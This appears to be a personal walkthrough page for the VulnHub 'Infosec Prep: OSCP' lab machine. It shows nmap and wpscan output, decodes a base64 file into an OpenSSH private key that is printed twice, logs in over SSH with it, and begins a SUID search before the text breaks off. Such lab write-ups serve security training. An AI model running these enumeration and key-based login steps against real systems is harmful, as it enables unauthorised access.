@@ -1,0 +1,236 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Infosec Prep: OSCP Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Infosec Prep: OSCP Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#oscp">Shell - oscp</a></li>
+        <li><a href="#root">Privesc - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>This box was very easy.  We begin with a wordpress site.  Shortly after, we find /robots.txt that directs us to a private SSH key.  Upon running linpeas we find bash set with the SUID bit.  We get root.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Wed Sep 29 11:22:43 2021 as: nmap -p- -oN ping_tcp 10.0.0.23&#13;&#10;Nmap scan report for 10.0.0.23&#13;&#10;Host is up (0.00086s latency).&#13;&#10;Not shown: 65532 closed ports&#13;&#10;PORT      STATE SERVICE&#13;&#10;22/tcp    open  ssh&#13;&#10;80/tcp    open  http&#13;&#10;33060/tcp open  mysqlx&#13;&#10;MAC Address: 00:0C:29:F6:73:1F (VMware)&#13;&#10;&#13;&#10;# Nmap done at Wed Sep 29 11:22:51 2021 -- 1 IP address (1 host up) scanned in 8.12 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Wed Sep 29 11:23:17 2021 as: nmap -p22,80,33060 -sV -sC -oN script_tcp 10.0.0.23&#13;&#10;Nmap scan report for 10.0.0.23&#13;&#10;Host is up (0.00018s latency).&#13;&#10;&#13;&#10;PORT      STATE SERVICE VERSION&#13;&#10;22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)&#13;&#10;|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)&#13;&#10;|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)&#13;&#10;80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))&#13;&#10;|_http-generator: WordPress 5.4.2&#13;&#10;| http-robots.txt: 1 disallowed entry &#13;&#10;|_/secret.txt&#13;&#10;|_http-server-header: Apache/2.4.41 (Ubuntu)&#13;&#10;|_http-title: OSCP Voucher &amp;#8211; Just another WordPress site&#13;&#10;33060/tcp open  mysqlx?&#13;&#10;| fingerprint-strings: &#13;&#10;|   LDAPSearchReq, SSLSessionReq, TLSSessionReq: &#13;&#10;|     Invalid message&quot;&#13;&#10;|_    HY000&#13;&#10;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&#13;&#10;SF-Port33060-TCP:V=7.91%I=7%D=9/29%Time=615484F2%P=x86_64-pc-linux-gnu%r(N&#13;&#10;SF:ULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b\&#13;&#10;SF:x08\x05\x1a\0&quot;)%r(HTTPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RPCCh&#13;&#10;SF:eck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVersionBindReqTCP,9,&quot;\x05\0\&#13;&#10;SF:0\0\x0b\x08\x05\x1a\0&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SSLS&#13;&#10;SF:essionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x8&#13;&#10;SF:8&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\&#13;&#10;SF:0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20me&#13;&#10;SF:ssage\&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBPr&#13;&#10;SF:ogNeg,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0&#13;&#10;SF:\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(&#13;&#10;SF:LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x1&#13;&#10;SF:0\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(ms-sql-s,9,&quot;\x05\0\0\0\&#13;&#10;SF:x0b\x08\x05\x1a\0&quot;)%r(afp,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(giop,9,&quot;\&#13;&#10;SF:x05\0\0\0\x0b\x08\x05\x1a\0&quot;);&#13;&#10;MAC Address: 00:0C:29:F6:73:1F (VMware)&#13;&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Wed Sep 29 11:25:34 2021 -- 1 IP address (1 host up) scanned in 136.80 seconds
+    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>We start with the web server where we are presented with a wordpress site.  At the bottom of the post on the main page it tells us the only user on the box is oscp.</li>
+
+    <pre>
+Heya! Welcome to the hunt.
+
+In order to enter the give away, you must obtain the root flag located in /root/. Once you’ve obtained the flag, message the TryHarder bot with the command !flag <insert flag>. It will then validate the flag for verification. Should it be incorrect, it will let you know. If it’s correct, you will be given a new role on the server where you can chat with others in a private channel. Once you’ve received the role you are entered into the give away!
+
+You must be a member of the server in order to use the command above.
+
+For those downloading this box off vulnhub at a later time, the command above will no longer be available.
+
+<mark>Oh yea! Almost forgot the only user on this box is “oscp”.</mark>
+
+A big thank you to Offensive Security for providing the voucher.
+
+Happy Hunting
+
+-FalconSpy & InfoSec Prep Discord Server
+
+( https://discord.gg/RRgKaep )
+    </pre>
+
+    <li>Next I run wpscan and it lets us know that robots.txt exists.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/Infosec_Prep_OSCP/exfiltrated]
+└─$ wpscan --url http://10.0.0.23                                                                             130 ⨯
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.18
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.0.0.23/ [10.0.0.23]
+[+] Started: Wed Sep 29 12:09:15 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+<mark>[+] robots.txt found: http://10.0.0.23/robots.txt</mark>
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+                (Lines Removed)
+    </pre>
+    
+    <br>
+
+    <h2><a id="oscp">Shell - oscp</a></h2>
+
+    <li>Robots.txt directs us to /secret.txt</li>
+
+    <pre>
+User-Agent: *
+Disallow: /secret.txt
+    </pre>
+
+    <li>Secret.txt appears to be base64, so I decode it.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/Infosec_Prep_OSCP/exfiltrated]
+└─$ echo -n "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
+QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
+d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
+K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
+ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
+UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
+MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY
+S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0
+eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ
+aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj
+MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy
+aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS
+d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0
+SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw
+NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ
+ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1
+R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ
+THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT
+WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC
+M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu
+dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np
+c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i
+VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB
+cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq
+NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz
+NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG
+cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl
+MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r
+bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK
+eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r
+TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP
+cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV
+blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y
+CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB
+SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H
+bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK
+TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp
+a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK
+T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx
+djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS
+aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0
+RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy
+ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr
+dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
+bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
+T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==" | base64 -d
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
+-----END OPENSSH PRIVATE KEY-----
+    </pre>
+
+    <li>We gain a private SSH key.  This must be for the user oscp.  I create a file called oscp_rsa and set 600 permissions on it.  600 permissions are required for private SSH keyss.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Infosec_Prep_OSCP/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ cat oscp_rsa                                                                        &#13;&#10;-----BEGIN OPENSSH PRIVATE KEY-----&#13;&#10;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&#13;&#10;8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=&#13;&#10;-----END OPENSSH PRIVATE KEY-----&#13;&#10;                                                                                                                    &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Infosec_Prep_OSCP/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ chmod 600 oscp_rsa   
+    </pre>
+
+    <li>Now we can use it to login as oscp.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Infosec_Prep_OSCP/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ ssh oscp@10.0.0.23 -i oscp_rsa&#13;&#10;Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)&#13;&#10;&#13;&#10; * Documentation:  https://help.ubuntu.com&#13;&#10; * Management:     https://landscape.canonical.com&#13;&#10; * Support:        https://ubuntu.com/advantage&#13;&#10;&#13;&#10;  System information as of Wed 29 Sep 2021 04:15:21 PM UTC&#13;&#10;&#13;&#10;  System load:  0.06               Processes:             211&#13;&#10;  Usage of /:   25.6% of 19.56GB   Users logged in:       0&#13;&#10;  Memory usage: 61%                IPv4 address for eth0: 10.0.0.23&#13;&#10;  Swap usage:   5%&#13;&#10;&#13;&#10;&#13;&#10;0 updates can be installed immediately.&#13;&#10;0 of these updates are security updates.&#13;&#10;&#13;&#10;&#13;&#10;The list of available updates is more than a week old.&#13;&#10;To check for new updates run: sudo apt update&#13;&#10;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&#13;&#10;&#13;&#10;&#13;&#10;Last login: Wed Sep 29 15:46:31 2021 from 10.0.0.1&#13;&#10;-bash-5.0$ 
+    </pre>
+
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>We check for programs with the SUID bit set and find bash.</li>
+
+    <pre>&#13;&#10;-bash-5.0$ find / -perm -u=s -ls 2&gt;/dev/null&#13;&#10;      130    109 -rwsr-xr-x   1 root     root       110792 Apr 10  2020 /snap/snapd/7264/usr/lib/snapd/snap-confine&#13;&#10;      130    109 -rwsr-xr-x   1 root     root       110792 Jun  5  2020 /snap/snapd/8140/usr/lib/snapd/snap-confine&#13;&#10;       55     43 -rwsr-xr-x   1 root     root        43088 Jan  8  2020 /snap/core18/1705/bin/mount&#13;&#10;       64     63 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /snap/core18/1705/bin/ping&#13;&#10;       80     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /snap/core18/1705/bin/su&#13;&#10;       98     27 -rwsr-xr-x   1 root     root        26696 Jan  8  2020 /snap/core18/1705/bin/umount&#13;&#10;     1731     75 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /snap/core18/1705/usr/bin/chfn&#13;&#10;     1733     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /snap/core18/1705/usr/bin/chsh&#13;&#10;     1784     75 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /snap/core18/1705/usr/bin/gpasswd&#13;&#10;     1848     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /snap/core18/1705/usr/bin/newgrp&#13;&#10;     1860     59 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /snap/core18/1705/usr/bin/passwd&#13;&#10;     1951    146 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /snap/core18/1705/usr/bin/sudo&#13;&#10;     2038     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper&#13;&#10;     2346    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1705/usr/lib/openssh/ssh-keysign&#13;&#10;       55     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1754/bin/mount&#13;&#10;       64     63 -rwsr-xr-x   1 root     root               64424 Jun 